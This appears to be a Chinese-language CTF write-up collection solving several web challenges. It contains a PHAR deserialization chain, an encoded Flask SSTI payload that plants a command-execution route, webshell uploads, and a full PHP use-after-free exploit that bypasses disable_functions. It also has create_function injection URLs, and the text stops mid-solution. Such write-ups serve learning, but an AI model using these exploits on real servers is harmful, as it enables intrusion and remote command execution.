&lt;body&gt; &lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt; &lt;div class&#x3D;&quot;container-fluid&quot;&gt; &lt;div class&#x3D;&quot;navbar-header&quot;&gt; &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;index.php&quot;&gt;首页&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;ul class&#x3D;&quot;nav navbar-nav navbra-toggle&quot;&gt; &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;file.php?file&#x3D;&quot;&gt;查看文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;li&gt;&lt;a href&#x3D;&quot;upload_file.php&quot;&gt;上传文件&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;ul class&#x3D;&quot;nav navbar-nav navbar-right&quot;&gt; &lt;li&gt;&lt;a href&#x3D;&quot;index.php&quot;&gt;&lt;span class&#x3D;&quot;glyphicon glyphicon-user&quot;&gt;&lt;&#x2F;span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;div&gt; &lt;&#x2F;nav&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;!--flag is in f1ag.php--&gt; file.php &lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;); include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;); $file &#x3D; $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2&#x2F;&gt;&quot;; &#125; $show &#x3D; new Show(); if(file_exists($file)) &#123; $show-&gt;source &#x3D; $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#39;file doesn\\&#39;t exists.&#39;); &#125; ?&gt; upload_file.php &lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div align &#x3D; &quot;center&quot;&gt; &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;&#x2F;h1&gt; &lt;&#x2F;div&gt; &lt;style&gt; p&#123; margin:0 auto&#125; &lt;&#x2F;style&gt; &lt;div&gt; &lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;label for&#x3D;&quot;file&quot;&gt;文件名:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt; &lt;&#x2F;div&gt; &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; class.php &lt;?php &#x2F;&#x2F;show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text&#x2F;html;charset&#x3D;utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename &#x3D; md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; &#x2F;&#x2F;mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload&#x2F;&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $filename); echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;&#x2F;script&gt;&#39;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types &#x3D; array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp &#x3D; explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension &#x3D; end($temp); if(empty($extension)) &#123; &#x2F;&#x2F;echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4&#x2F;&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#39;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;&#x2F;script&gt;&#39;; return false; &#125; &#125; &#125; ?&gt; class.php &lt;?php class C1e4r &#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str &#x3D; $name; &#125; public function __destruct() &#123; $this-&gt;test &#x3D; $this-&gt;str; echo $this-&gt;test; &#125; &#125; class Show &#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source &#x3D; $file; &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key &#x3D; $value; &#125; public function _show() &#123; if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\\.\\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123; die(&#39;hacker!&#39;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\\.\\.&#x2F;i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source &#x3D; &quot;index.php&quot;; &#125; &#125; &#125; class Test &#123; public $file; public $params; public function __construct() &#123; $this-&gt;params &#x3D; array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value &#x3D; $this-&gt;params[$key]; &#125; else &#123; $value &#x3D; &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text &#x3D; base64_encode(file_get_contents($value)); return $text; &#125; &#125; ?&gt; 肯定是用这个函数来读取flag文件，但是没有反序列化的地方 加个新知识 利用phar协议实现反序列化漏洞攻击 漏洞成因 phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数(file_exists()、is_dir()等)参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作 原理分析 phar的组成 通过查阅手册发现phar由四部分组成；翻阅手册可以知道，phar由四个部分组成，分别是stub、manifest describing the contents、 the file contents、 [optional] a signature for verifying Phar integrity (phar file format only) 下面进行解释一下； 1 .0 a stub 标识作用，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt; ，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件； 2 .0 a manifest describing the contents 其实可以理解为phar文件本质上是一中压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面； 3 .0 the file contents 这里指的是被压缩文件的内容； 4 .0 [optional] a signature for verifying Phar integrity (phar file format only) 签名，放在结尾； C1e4r类中有__destruct(), __destruct()是PHP中的析构方法，在对象被销毁时被调用，程序结束时会被自动调用销毁对象。 函数中发现了echo，那么要利用echo $this-&gt;test。 show类有__toString(), __toString方法在将一个对象转化成字符串时被自动调用，比如进行echo，print操作时会被调用并返回一个字符串。 利用$this-&gt;str[&#39;str&#39;]-&gt;source; Test类有__get（） __get（）当未定义的属性或没有权限访问的属性被访问时该方法会被调用。 利用 $this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value)); 利用C1e4r类的__destruct()中的echo this-&gt;test2.触发Show类的__toString()3.利用Show类的this-&gt;test2.触发Show类的__toString()3.利用Show类的content = $this-&gt;str[&#39;str&#39;]-&gt;source4.触发Test类的__get()5.成功利用file_get()`读文件 反序列化结果 &lt;?php class C1e4r &#123; public $test; public $str; &#125; class Show &#123; public $source; public $str; &#125; class Test &#123; public $file; public $params; &#125; $a &#x3D; new C1e4r(); $b &#x3D; new Show(); $c &#x3D; new Test(); $a -&gt;str &#x3D; $b; $b -&gt;str[&#39;str&#39;] &#x3D; $c; $c -&gt;params[&#39;source&#39;] &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;; $phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.phar文件 $phar-&gt;startBuffering(); $phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;固定的 $phar-&gt;setMetadata($a); &#x2F;&#x2F;触发的头是C1e4r类，所以传入C1e4r对象 $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;随便写点什么生成个签名 $phar-&gt;stopBuffering(); ?&gt; 生成phar文件后，改个后缀上传就行，phar的文件不管什么后缀都会直接执行 看上传的文件（也可以根据源码推文件名，然后利用phar://协议访问 得到flag [HarekazeCTF2019]encode_and_encode source &lt;?php error_reporting(0); if (isset($_GET[&#39;source&#39;])) &#123; show_source(__FILE__); exit(); &#125; function is_valid($str) &#123; $banword &#x3D; [ &#x2F;&#x2F; no path traversal &#39;\\.\\.&#39;, &#x2F;&#x2F; no stream wrapper &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;, &#x2F;&#x2F; no data exfiltration &#39;flag&#39; ]; $regexp &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $banword) . &#39;&#x2F;i&#39;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true; &#125; $body &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;); #body获取post数据 $json &#x3D; json_decode($body, true); #对body变量进行json解码 if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123;#判断body变量是否有效，json数据要有page $page &#x3D; $json[&#39;page&#39;]; $content &#x3D; file_get_contents($page); #从page中读出文件名，并读取文件 if (!$content || !is_valid($content)) &#123;#检查content是否有效,即不能明文传输flag文件，利用php伪协议绕过 $content &#x3D; &quot;&lt;p&gt;not found&lt;&#x2F;p&gt;\\n&quot;; &#125; &#125; else &#123; $content &#x3D; &#39;&lt;p&gt;invalid request&lt;&#x2F;p&gt;&#39;; &#125; &#x2F;&#x2F; no data exfiltration!!! $content &#x3D; preg_replace(&#39;&#x2F;HarekazeCTF\\&#123;.+\\&#125;&#x2F;i&#39;, &#39;HarekazeCTF&#123;&lt;censored&gt;&#125;&#39;, $content);#如果查到content里有相关的ctf字样，则用censored替代 echo json_encode([&#39;content&#39; &#x3D;&gt; $content]);#最后将json编码后的content输出 [WUSTCTF2020]CV Maker进去后是个看起来很高端的界面，但是注册然后登录后有个明显 的上传位置 通过更改头像传个马上去，蚁剑连接就行 这里前端有个判断图片类型的地方，所以先传个jpg再bp抓包改成php就行 [RootersCTF2019]I_&lt;3_Flaskssti注入，用使用工具Arjun进行参数爆破 然后找到name参数后，拿出珍藏的写入shell的payload ctf中flask_ssti的各种绕过技巧 - 先知社区 (aliyun.com) &#123;% if 1&#x3D;&#x3D;lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;exec&#39;](&#39;\\x66\\x72\\x6f\\x6d\\x20\\x66\\x6c\\x61\\x73\\x6b\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x63\\x75\\x72\\x72\\x65\\x6e\\x74\\x5f\\x61\\x70\\x70\\x0a\\x0a\\x40\\x63\\x75\\x72\\x72\\x65\\x6e\\x74\\x5f\\x61\\x70\\x70\\x2e\\x72\\x6f\\x75\\x74\\x65\\x28\\x27\\x2f\\x73\\x68\\x65\\x6c\\x6c\\x27\\x2c\\x6d\\x65\\x74\\x68\\x6f\\x64\\x73\\x3d\\x5b\\x27\\x47\\x45\\x54\\x27\\x2c\\x27\\x50\\x4f\\x53\\x54\\x27\\x5d\\x29\\x0a\\x64\\x65\\x66\\x20\\x73\\x68\\x65\\x6c\\x6c\\x28\\x29\\x3a\\x0a\\x20\\x20\\x20\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73\\x0a\\x20\\x20\\x20\\x20\\x66\\x72\\x6f\\x6d\\x20\\x66\\x6c\\x61\\x73\\x6b\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x0a\\x20\\x20\\x20\\x20\\x63\\x6d\\x64\\x3d\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2e\\x61\\x72\\x67\\x73\\x2e\\x67\\x65\\x74\\x28\\x27\\x63\\x6d\\x64\\x27\\x29\\x0a\\x20\\x20\\x20\\x20\\x72\\x74\\x3d\\x6f\\x73\\x2e\\x70\\x6f\\x70\\x65\\x6e\\x28\\x63\\x6d\\x64\\x29\\x2e\\x72\\x65\\x61\\x64\\x28\\x29\\x0a\\x20\\x20\\x20\\x20\\x72\\x65\\x74\\x75\\x72\\x6e\\x20\\x72\\x74&#39;) %&#125;&#123;% endif%&#125; 其中的16进制编码了原始代码 即 from flask import current_app @current_app.route(&#39;&#x2F;shell&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;]) def shell(): import os from flask import request cmd&#x3D;request.args.get(&#39;cmd&#39;) rt&#x3D;os.popen(cmd).read() return rt 写入 然后直接写入命令 可能会出现not found的报错，多试几次 [CISCN2019 华东南赛区]Double Secret 有/secret目录，扫一下或者猜出来 arjun扫一下是否有传参 当数过大时就会进入debug界面，这时候基本就确定这是ssti注入了，可以看看源码 采用RC4加密的方式，这是一种对称加密，对密文再次加密就会变成明文，密钥是HereIsTreasure，知道这个后，利用cyberchef，对要输入的语句进行加密，再将密文传参进去 能找到根目录下的flag.txt cat读取 这里应该是取巧了，buu的flag里不包含ciscn，所以这个过滤就没用了 从一道ctf题谈谈flask开启debug模式存在的安全问题_pin (sohu.com) [红明谷CTF 2021]write_shell&lt;?php error_reporting(0); highlight_file(__FILE__); function check($input)&#123; if(preg_match(&quot;&#x2F;&#39;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;&#x2F;i&quot;,$input))&#123; &#x2F;&#x2F; if(preg_match(&quot;&#x2F;&#39;| |_|&#x3D;|php&#x2F;&quot;,$input))&#123; die(&#39;hacker!!!&#39;); &#125;else&#123; return $input; &#125; &#125; function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key&#x3D;&gt;$output)&#123; $input[$key] &#x3D; waf($output); &#125; &#125;else&#123; $input &#x3D; check($input); &#125; &#125; $dir &#x3D; &#39;sandbox&#x2F;&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;&#x2F;&#39;; if(!file_exists($dir))&#123; mkdir($dir); &#125; switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123; case &#39;pwd&#39;: echo $dir; break; case &#39;upload&#39;: $data &#x3D; $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data); &#125; ?&gt; 过滤；可以利用短标签，过滤eval可以采用反引号，过滤空格可以用\\t PHP中有两种短标签，&lt;??&gt;和&lt;?&#x3D;?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?&#x3D;?&gt;则是相当于&lt;? echo&gt;。 ?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls\\t&#x2F;&#96;?&gt; ?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\\t&#x2F;flllllll1112222222lag&#96;?&gt; 或者 ?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat\\t&#x2F;f*&#96;?&gt; *为通配符 [GYCTF2020]EasyThinking题目时thinkphp6版本的漏洞 ThinkPHP6 任意文件操作漏洞分析 - 链滴 (ld246.com) 只需要构造 PHPSESSID 的值即可，值为 string&amp;&amp;长度为 32 此时查看一下生成的 session，生成的 session 文件保存在 \\runtime\\session 下 session 里的内容: a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;thinkphp&quot;;&#125; 可以看到 session 的内容经过了序列化操作，只要将 session 的内容反序列化即可 getshell 这个师傅构造了一个向SESSION中写入值的类和函数，但是在本题中，搜索的内容直接被写入了SESSION（别问，问就是我也看不懂 所以我们可以修改session为.php的后缀，然后 在搜索栏里搜个马，就可以在/runtime/session路径下访问并执行这个马 先试试phpinfo /runtime/session/sess_0123456789012345678901234568.php 写个一句话木马 蚁剑连接 根目录又flag但是打开没东西，还有一个readflag是二进制文件,猜测是要执行readflag来读取flag文件里的内容 但是在虚拟终端无法执行命令 结合phpinfo里的禁用函数 能得出这是个突破disable_function限制执行命令的考点 之前[极客大挑战 2019]RCE ME也有这个考点（往上翻 但是在这道题里用蚁剑的插件没法绕过 上个exp（羡慕能写出这种exp的大师傅 &lt;?php pwn(&quot;&#x2F;readflag&quot;); function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;) if (!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4 $backtrace &#x3D; debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123; $address &#x3D; 0; for ($j &#x3D; $s - 1; $j &gt;&#x3D; 0; $j--) &#123; $address &lt;&lt;&#x3D; 8; $address |&#x3D; ord($str[$p + $j]); &#125; return $address; &#125; function ptr2str($ptr, $m &#x3D; 8) &#123; $out &#x3D; &quot;&quot;; for ($i &#x3D; 0; $i &lt; $m; $i++) &#123; $out .&#x3D; chr($ptr &amp; 0xff); $ptr &gt;&gt;&#x3D; 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123; $i &#x3D; 0; for ($i &#x3D; 0; $i &lt; $n; $i++) &#123; $str[$p + $i] &#x3D; chr($v &amp; 0xff); $v &gt;&gt;&#x3D; 8; &#125; &#125; function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak &#x3D; strlen($helper-&gt;a); if ($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type &#x3D; leak($base, 0x10, 2); $e_phoff &#x3D; leak($base, 0x20); $e_phentsize &#x3D; leak($base, 0x36, 2); $e_phnum &#x3D; leak($base, 0x38, 2); for ($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123; $header &#x3D; $base + $e_phoff + $i * $e_phentsize; $p_type &#x3D; leak($header, 0, 4); $p_flags &#x3D; leak($header, 4, 4); $p_vaddr &#x3D; leak($header, 0x10); $p_memsz &#x3D; leak($header, 0x28); if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr; $data_size &#x3D; $p_memsz; &#125; else if ($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec $text_size &#x3D; $p_memsz; &#125; &#125; if (!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) &#x3D; $elf; for ($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123; $leak &#x3D; leak($data_addr, $i * 8); if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); # &#39;constant&#39; constant check if ($deref !&#x3D; 0x746e6174736e6f63) continue; &#125; else continue; $leak &#x3D; leak($data_addr, ($i + 4) * 8); if ($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); # &#39;bin2hex&#39; constant check if ($deref !&#x3D; 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base &#x3D; 0; $start &#x3D; $binary_leak &amp; 0xfffffffffffff000; for ($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123; $addr &#x3D; $start - 0x1000 * $i; $leak &#x3D; leak($addr, 0, 7); if ($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr &#x3D; $basic_funcs; do &#123; $f_entry &#x3D; leak($addr); $f_name &#x3D; leak($f_entry, 0, 6); if ($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr +&#x3D; 0x20; &#125; while ($f_entry !&#x3D; 0); return false; &#125; function trigger_uaf($arg) &#123; # str_shuffle prevents opcache string interning $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79)); $vuln &#x3D; new Vuln(); $vuln-&gt;a &#x3D; $arg; &#125; if (stristr(PHP_OS, &#39;WIN&#39;)) &#123; die(&#39;This PoC is for *nix systems only.&#39;); &#125; $n_alloc &#x3D; 10; # increase this value if UAF fails $contiguous &#x3D; []; for ($i &#x3D; 0; $i &lt; $n_alloc; $i++) $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79)); trigger_uaf(&#39;x&#39;); $abc &#x3D; $backtrace[1][&#39;args&#39;][0]; $helper &#x3D; new Helper; $helper-&gt;b &#x3D; function ($x) &#123; &#125;; if (strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123; die(&quot;UAF failed&quot;); &#125; # leaks $closure_handlers &#x3D; str2ptr($abc, 0); $php_heap &#x3D; str2ptr($abc, 0x58); $abc_addr &#x3D; $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj &#x3D; str2ptr($abc, 0x20); $binary_leak &#x3D; leak($closure_handlers, 8); if (!($base &#x3D; get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#39;t determine binary base address&quot;); &#125; if (!($elf &#x3D; parse_elf($base))) &#123; die(&quot;Couldn&#39;t parse ELF header&quot;); &#125; if (!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#39;t get basic_functions address&quot;); &#125; if (!($zif_system &#x3D; get_system($basic_funcs))) &#123; die(&quot;Couldn&#39;t get zif_system address&quot;); &#125; # fake closure object $fake_obj_offset &#x3D; 0xd0; for ($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit(); &#125; 把这个php文件找个地方传上去 访问这个路径，得到flag [BJDCTF2020]EzPHP这个题质量好高 中间这个东西链接好像寄了，但是不影响做题，源码里有串base32，解码为1nD3x.php 访问这个页面 &lt;?php highlight_file(__FILE__); error_reporting(0); $file &#x3D; &quot;1nD3x.php&quot;; $shana &#x3D; $_GET[&#39;shana&#39;]; $passwd &#x3D; $_GET[&#39;passwd&#39;]; $arg &#x3D; &#39;&#39;; $code &#x3D; &#39;&#39;; echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;; if($_SERVER) &#123; if ( preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\&quot;|\\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;]) ) die(&#39;You seem to want to do something bad?&#39;); &#125; if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123; if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123; $file &#x3D; $_GET[&quot;file&quot;]; echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;; &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;); if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value)) die(&#39;fxck you! I hate English!&#39;); &#125; &#125; if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;) die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;); if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123; extract($_GET[&quot;flag&quot;]); echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;; &#125; else&#123; die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;); &#125; if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\&#96;|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#39;|\\&#x3D;|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^&#x2F;i&#39;, $arg) ) &#123; die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); &#125; else &#123; include &quot;flag.php&quot;; $code(&#39;&#39;, $arg); &#125; ?&gt; 过滤了一堆东西 首先是这个，query_string获取的内容不会进行url解码，所以绕过这一步就只需要把传入的参数进行url编码就行 这里可以用换行符%0a绕过preg_match的匹配 这个由于检测的$_REQUEST，而对 $_REQUEST来说post的优先级大于get，所以要post传入和get内容相同的参数，把值改为数字就行 这个要用data://伪协议就行 常见的数组绕过 最后这也是最重要的地方 首先说一下create_function注入 create_function() 函数有两个参数 $args 和 $code，用于创建一个 lambda 样式的函数 但是我们可以通过对b进行操作，来实现这个函数的提前闭合，并写入我们想要的命令，然后通过注释符使语句合理 $arg 和 $code 变量都是可控的，因为 extract() 函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量。因此只要 extract() 内的数组键名为 arg 和 code，键值为我们构造的用来注入的代码，即可实现 $arg 和 $code 的变量覆盖，导致代码注入。 再利用 var_dump(get_defined_vars()) 用来输出所有变量和值 &#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e 解码内容： &#x2F;1nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZGVidV9kZWJ1X2FxdWE&#x3D;&amp;debu&#x3D;aqua_is_cute &amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function 但是看见flag在rea1fl4g里 所以要利用require包含这个文件然后再用get_defined_vars()读一遍试试 但是又过滤了. 所以试试base64编码 GET: 